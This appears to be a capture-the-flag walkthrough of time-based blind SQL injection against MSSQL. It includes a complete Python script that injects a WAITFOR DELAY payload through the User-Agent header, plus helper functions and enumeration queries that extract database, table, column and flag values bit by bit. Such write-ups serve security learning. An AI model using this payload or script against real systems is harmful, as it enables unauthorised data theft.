# 📤 Time-based Data Extraction

## Overview

Full database enumeration using time-based blind SQLi:
1. Enumerate database name
2. Enumerate table names
3. Enumerate column names
4. Extract data

---

## Helper Functions

### Dump Number (SQL-Anding)

```python
def dumpNumber(q):
    """Extract a number (0-255) using bitwise operations"""
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length
```

### Dump String

```python
def dumpString(q, length):
    """Extract a string character by character"""
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
        print(chr(c), end='')
        sys.stdout.flush()
    return val
```

---

## Step 1: Enumerate Database Name

### Get Length

```python
db_name_length = dumpNumber("LEN(DB_NAME())")
print(f"DB name length: {db_name_length}")
```

**Output**: `8`

### Get Name

```python
db_name_length = 8  # Cache the value
db_name = dumpString("DB_NAME()", db_name_length)
print(f"Database: {db_name}")
```

**Output**: `digcraft`

---

## Step 2: Enumerate Table Names

### Get Table Count

```sql
SELECT COUNT(*) FROM information_schema.tables 
WHERE TABLE_CATALOG='digcraft'
```

```python
num_tables = dumpNumber(
    "SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='digcraft'"
)
print(f"Number of tables: {num_tables}")
```

**Output**: `2`

### Get Table Names

**MSSQL Pagination** (no LIMIT/OFFSET like MySQL):

```sql
SELECT table_name FROM information_schema.tables 
WHERE table_catalog='digcraft' 
ORDER BY table_name 
OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
```

```python
num_tables = 2  # Cached

for i in range(num_tables):
    # Get table name length
    table_name_length = dumpNumber(
        f"SELECT LEN(table_name) FROM information_schema.tables "
        f"WHERE table_catalog='digcraft' "
        f"ORDER BY table_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
    )
    
    # Get table name
    table_name = dumpString(
        f"SELECT table_name FROM information_schema.tables "
        f"WHERE table_catalog='digcraft' "
        f"ORDER BY table_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY",
        table_name_length
    )
    print(f"Table {i}: {table_name}")
```

**Output**:
```
4
flag
10
userAgents
```

---

## Step 3: Enumerate Column Names

### Get Column Count

```sql
SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.columns 
WHERE table_name='flag' AND table_catalog='digcraft'
```

```python
num_columns = dumpNumber(
    "SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.columns "
    "WHERE table_name='flag' AND table_catalog='digcraft'"
)
print(f"Number of columns: {num_columns}")
```

**Output**: `1`

### Get Column Names

```python
num_columns = 1  # Cached

for i in range(num_columns):
    # Get column name length
    column_name_length = dumpNumber(
        f"SELECT LEN(column_name) FROM INFORMATION_SCHEMA.columns "
        f"WHERE table_name='flag' AND table_catalog='digcraft' "
        f"ORDER BY column_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
    )
    
    # Get column name
    column_name = dumpString(
        f"SELECT column_name FROM INFORMATION_SCHEMA.columns "
        f"WHERE table_name='flag' AND table_catalog='digcraft' "
        f"ORDER BY column_name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY",
        column_name_length
    )
    print(f"Column {i}: {column_name}")
```

**Output**:
```
1
4
flag
```

---

## Step 4: Extract Data

### Enumerated So Far

| Item | Value |
|------|-------|
| Database | `digcraft` |
| Tables | `flag`, `userAgents` |
| Columns (flag) | `flag` |

### Get Row Count

```python
numberOfRows = dumpNumber("SELECT COUNT(*) FROM flag")
print(f"Rows in flag table: {numberOfRows}")
```

**Output**: `1`

### Get Data Length

```python
row1Length = dumpNumber("SELECT TOP 1 LEN(flag) FROM flag")
print(f"Flag length: {row1Length}")
```

**Output**: `37`

### Extract Data

```python
row1Value = dumpString("SELECT TOP 1 flag FROM flag", row1Length)
print(f"Flag: {row1Value}")
```

---

## Complete Extraction Script

```python
#!/usr/bin/env python3
import requests
import time
import sys

DELAY = 3

def oracle(q):
    start = time.time()
    response = requests.get(
        "http://<TARGET>:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start >= DELAY

def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
        print(chr(character), end='')
        sys.stdout.flush()
    print()
    return string

# Cached values from enumeration
DBName = "digcraft"
tableOneName = "flag"
columnName = "flag"

# Extract data
numberOfRows = dumpNumber("SELECT COUNT(*) FROM flag")
print(f"[*] Rows: {numberOfRows}")

row1Length = dumpNumber("SELECT TOP 1 LEN(flag) FROM flag")
print(f"[*] Data length: {row1Length}")

print("[*] Extracting: ", end='')
row1Value = dumpString("SELECT TOP 1 flag FROM flag", row1Length)
```

---

## MSSQL Pagination Reference

### MySQL Style (NOT available in MSSQL)

```sql
-- This does NOT work in MSSQL
SELECT * FROM table LIMIT 1 OFFSET 0
```

### MSSQL Style

```sql
-- Get first row
SELECT TOP 1 column FROM table

-- Get Nth row (offset-based)
SELECT column FROM table 
ORDER BY column 
OFFSET N ROWS FETCH NEXT 1 ROWS ONLY
```

---

## Performance Notes

### Why SQL-Anding?

With time-based injection, optimization is critical:

| Algorithm | Requests/Char | Time/Char (3s delay) |
|-----------|---------------|----------------------|
| Linear | ~64 avg | ~192 seconds |
| SQL-Anding | 7 | ~21 seconds |
| Bisection | 7 | ~21 seconds |

For a 32-character string:
- Linear: ~102 minutes
- Optimized: ~11 minutes

---

## Extraction Summary

```
1. DB_NAME() → digcraft (8 chars)
2. Tables → flag, userAgents
3. Columns (flag) → flag
4. Row count → 1
5. Data length → 37
6. Data → [extracted value]
```

---

## Quick Reference

### Key Queries

```sql
-- Database name
DB_NAME()
LEN(DB_NAME())

-- Table enumeration
SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog='db'
SELECT table_name FROM information_schema.tables WHERE table_catalog='db' 
  ORDER BY table_name OFFSET N ROWS FETCH NEXT 1 ROWS ONLY

-- Column enumeration
SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.columns 
  WHERE table_name='tbl' AND table_catalog='db'
SELECT column_name FROM INFORMATION_SCHEMA.columns 
  WHERE table_name='tbl' AND table_catalog='db'
  ORDER BY column_name OFFSET N ROWS FETCH NEXT 1 ROWS ONLY

-- Data extraction
SELECT COUNT(*) FROM table
SELECT TOP 1 LEN(column) FROM table
SELECT TOP 1 column FROM table
```

